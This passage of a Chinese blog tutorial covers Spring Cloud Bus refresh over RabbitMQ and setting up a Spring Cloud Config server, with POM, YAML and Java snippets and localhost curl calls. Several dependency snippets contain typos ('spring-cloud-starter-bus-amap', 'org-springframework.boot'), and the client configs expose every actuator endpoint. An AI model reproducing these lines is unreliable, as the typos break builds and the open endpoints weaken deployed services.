class="headerlink" title="Bus动态刷新全局广播配置实现"></a>Bus动态刷新全局广播配置实现</h3><p><strong>给cloud-config-center-3344配置中心服务端添加消息总线支持</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--添加消息总线RabbitMQ支持--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-bus-amap<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org-springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>YML</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">3344</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span>  <span class="string">cloud-config-center</span> <span class="comment">#注册进Eureka服务器的微服务名</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">config:</span></span><br><span class="line">      <span class="attr">server:</span></span><br><span class="line">        <span class="attr">git:</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">git@github.com:zzyybs/springcloud-config.git</span> <span class="comment">#GitHub上面的git仓库名字</span></span><br><span class="line">        <span class="comment">####搜索目录</span></span><br><span class="line">          <span class="attr">search-paths:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">springcloud-config</span></span><br><span class="line">      <span class="comment">####读取分支</span></span><br><span class="line">      <span class="attr">label:</span> <span class="string">master</span></span><br><span class="line"><span class="comment">#rabbitmq相关配置&lt;--------------------------</span></span><br><span class="line"><span class="attr">rabbitmq:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">localhost</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">5672</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">guest</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">guest</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#服务注册到eureka地址</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:7001/eureka</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##rabbitmq相关配置,暴露bus刷新配置的端点&lt;--------------------------</span></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span> <span class="comment">#暴露bus刷新配置的端点</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">'bus-refresh'</span></span><br></pre></td></tr></table></figure><p><strong>给cloud-config-client-3355客户端添加消息总线支持</strong></p><p>POM</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--添加消息总线RabbitNQ支持--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-bus-amap<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org-springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>YML</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">3355</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">config-client</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="comment">#Config客户端配置</span></span><br><span class="line">    <span class="attr">config:</span></span><br><span class="line">      <span class="attr">label:</span> <span class="string">master</span> <span class="comment">#分支名称</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">config</span> <span class="comment">#配置文件名称</span></span><br><span class="line">      <span class="attr">profile:</span> <span class="string">dev</span> <span class="comment">#读取后缀名称   上述3个综合：master分支上config-dev.yml的配置文件被读取http://config-3344.com:3344/master/config-dev.yml</span></span><br><span class="line">      <span class="attr">uri:</span> <span class="string">http://localhost:3344</span> <span class="comment">#配置中心地址k</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#rabbitmq相关配置 15672是Web管理界面的端口；5672是MQ访问的端口&lt;----------------------</span></span><br><span class="line">  <span class="attr">rabbitmq:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">localhost</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">5672</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">guest</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">guest</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#服务注册到eureka地址</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:7001/eureka</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴露监控端点</span></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">"*"</span></span><br></pre></td></tr></table></figure><p><strong>给cloud-config-client-3366客户端添加消息总线支持</strong></p><p>POM</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--添加消息总线RabbitNQ支持--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-bus-amap<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org-springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>yml</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">3366</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">config-client</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="comment">#Config客户端配置</span></span><br><span class="line">    <span class="attr">config:</span></span><br><span class="line">      <span class="attr">label:</span> <span class="string">master</span> <span class="comment">#分支名称</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">config</span> <span class="comment">#配置文件名称</span></span><br><span class="line">      <span class="attr">profile:</span> <span class="string">dev</span> <span class="comment">#读取后缀名称   上述3个综合：master分支上config-dev.yml的配置文件被读取http://config-3344.com:3344/master/config-dev.yml</span></span><br><span class="line">      <span class="attr">uri:</span> <span class="string">http://localhost:3344</span> <span class="comment">#配置中心地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#rabbitmq相关配置 15672是Web管理界面的端口；5672是MQ访问的端口&lt;-----------------------</span></span><br><span class="line">  <span class="attr">rabbitmq:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">localhost</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">5672</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">guest</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">guest</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#服务注册到eureka地址</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:7001/eureka</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴露监控端点</span></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">"*"</span></span><br></pre></td></tr></table></figure><p><strong>测试</strong></p><ul><li>启动<ul><li>EurekaMain7001</li><li>ConfigcenterMain3344</li><li>ConfigclientMain3355</li><li>ConfigclicntMain3366</li></ul></li></ul><ul><li><p>运维工程师</p><ul><li>修改Github上配置文件内容，增加版本号</li><li>发送POST请求<ul><li>curl -X POST “<a href="http://localhost:3344/actuator/bus-refresh" target="_blank" rel="noopener">http://localhost:3344/actuator/bus-refresh</a>“</li><li>—次发送，处处生效</li></ul></li></ul></li><li><p>配置中心</p><ul><li><a href="http://config-3344.com:3344/config-dev.yml" target="_blank" rel="noopener">http://config-3344.com:3344/config-dev.yml</a></li></ul></li></ul><ul><li>客户端<ul><li><a href="http://localhost:3355/configlnfo" target="_blank" rel="noopener">http://localhost:3355/configlnfo</a></li><li><a href="http://localhost:3366/configInfo" target="_blank" rel="noopener">http://localhost:3366/configInfo</a></li><li>获取配置信息，发现都已经刷新了</li></ul></li></ul><p>—次修改，广播通知，处处生效</p><h3 id="Bus动态刷新定点通知"><a href="#Bus动态刷新定点通知" class="headerlink" title="Bus动态刷新定点通知"></a>Bus动态刷新定点通知</h3><p>不想全部通知，只想定点通知</p><ul><li><p>只通知3355</p></li><li><p>不通知3366</p></li></ul><p>简单一句话 - 指定具体某一个实例生效而不是全部</p><ul><li><p>公式：<a href="http://localhost:3344/actuator/bus-refresh/{destination}" target="_blank" rel="noopener">http://localhost:3344/actuator/bus-refresh/{destination}</a></p></li><li><p>/bus/refresh请求不再发送到具体的服务实例上，而是发给config server通过destination参数类指定需要更新配置的服务或实例</p></li></ul><p>案例</p><ul><li>我们这里以刷新运行在3355端口上的config-client（配置文件中设定的应用名称）为例，只通知3355，不通知3366</li><li>curl -X POST “<a href="http://localhost:3344/actuator/bus-refresh/config-client:3355" target="_blank" rel="noopener">http://localhost:3344/actuator/bus-refresh/config-client:3355</a></li></ul><p><strong>通知总结</strong></p><p><img src="/img/springcloud2020/bus4.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> spring cloud </tag>
            
            <tag> bus消息总线 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cpnfig配置中心</title>
      <link href="/2021/09/05/config%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83/"/>
      <url>/2021/09/05/config%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83/</url>
      
        <content type="html"><![CDATA[<h3 id="Config分布式配置中心介绍"><a href="#Config分布式配置中心介绍" class="headerlink" title="Config分布式配置中心介绍"></a>Config分布式配置中心介绍</h3><p>分布式系统面临的配置问题</p><p>微服务意味着要将单体应用中的业务拆分成一个个子服务，每个服务的粒度相对较小，因此系统中会出现大量的服务。由于每个服务都需要必要的配置信息才能运行，所以一套集中式的、动态的配置管理设施是必不可少的。</p><p>SpringCloud提供了ConfigServer来解决这个问题，我们每一个微服务自己带着一个application.yml，上百个配置文件的管理.……</p><p><strong>是什么</strong><br><img src="/img/springcloud2020/config0.png" alt=""></p><p>SpringCloud Config为微服务架构中的微服务提供集中化的外部配置支持，配置服务器为各个不同微服务应用的所有环境提供了一个中心化的外部配置。</p><p><strong>怎么玩</strong></p><p>SpringCloud Config分为服务端和客户端两部分。</p><ul><li><p>服务端也称为分布式配置中心，它是一个独立的微服务应用，用来连接配置服务器并为客户端提供获取配置信息，加密/解密信息等访问接口。</p></li><li><p>客户端则是通过指定的配置中心来管理应用资源，以及与业务相关的配置内容，并在启动的时候从配置中心获取和加载配置信息配置服务器默认采用git来存储配置信息，这样就有助于对环境配置进行版本管理，并且可以通过git客户端工具来方便的管理和访问配置内容。</p></li></ul><p><strong>能干嘛</strong></p><ul><li><p>集中管理配置文件</p></li><li><p>不同环境不同配置，动态化的配置更新，分环境部署比如dev/test/prod/beta/release</p></li><li><p>运行期间动态调整配置，不再需要在每个服务部署的机器上编写配置文件，服务会向配置中心统一拉取配置自己的信息</p></li><li><p>当配置发生变动时，服务不需要重启即可感知到配置的变化并应用新的配置</p></li><li><p>将配置信息以REST接口的形式暴露 - post/crul访问刷新即可…</p></li></ul><p><strong>与GitHub整合配置</strong></p><p>由于SpringCloud Config默认使用Git来存储配置文件(也有其它方式,比如支持SVN和本地文件)，但最推荐的还是Git，而且使用的是http/https访问的形式。</p><p><strong>官网</strong></p><p><a href="https://cloud.spring.io/spring-cloud-static/spring-cloud-config/2.2.1.RELEASE/reference/html/" target="_blank" rel="noopener">https://cloud.spring.io/spring-cloud-static/spring-cloud-config/2.2.1.RELEASE/reference/html/</a></p><h3 id="Config配置总控中心搭建"><a href="#Config配置总控中心搭建" class="headerlink" title="Config配置总控中心搭建"></a>Config配置总控中心搭建</h3><p>用你自己的账号在GitHub上新建一个名为springcloud-config的新Repository。</p><p>由上一步获得刚新建的git地址 - git@github.com:abc/springcloud-config.git。</p><p>本地硬盘目录上新建git仓库并clone。</p><ul><li>git clone git@github.com:abc/springcloud-config.git</li></ul><p>此时在工作目录会创建名为springcloud-config的文件夹。</p><p>在springcloud-config的文件夹种创建三个配置文件（为本次教学使用的）,随后git add .，git commit -m “sth”等一系列上传操作上传到springcloud-config的新Repository。</p><ul><li>config-dev.yml</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">config:</span></span><br><span class="line">  <span class="attr">info:</span> <span class="string">"master branch,springcloud-config/config-dev.yml version=7"</span></span><br></pre></td></tr></table></figure><ul><li>config-prod.yml</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">config:</span></span><br><span class="line">  <span class="attr">info:</span> <span class="string">"master branch,springcloud-config/config-prod.yml version=1"</span></span><br></pre></td></tr></table></figure><ul><li>config-test.yml</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">config:</span></span><br><span class="line">  <span class="attr">info:</span> <span class="string">"master branch,springcloud-config/config-test.yml version=1"</span></span><br></pre></td></tr></table></figure><p>新建Module模块cloud-config-center-3344，它即为Cloud的配置中心模块CloudConfig Center</p><p>POM</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>LearnCloud<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.lun.springcloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloud-config-center-3344<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--添加消息总线RabbitMQ支持--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-bus-amqp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-config-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>YML</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">3344</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span>  <span class="string">cloud-config-center</span> <span class="comment">#注册进Eureka服务器的微服务名</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">config:</span></span><br><span class="line">      <span class="attr">server:</span></span><br><span class="line">        <span class="attr">git:</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">git@github.com:zzyybs/springcloud-config.git</span> <span class="comment">#GitHub上面的git仓库名字</span></span><br><span class="line">        <span class="comment">####搜索目录</span></span><br><span class="line">          <span class="attr">search-paths:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">springcloud-config</span></span><br><span class="line">      <span class="comment">####读取分支</span></span><br><span class="line">      <span class="attr">label:</span> <span class="string">master</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#服务注册到eureka地址</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:7001/eureka</span></span><br></pre></td></tr></table></figure><p>主启动类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.config.server.EnableConfigServer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableConfigServer</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span 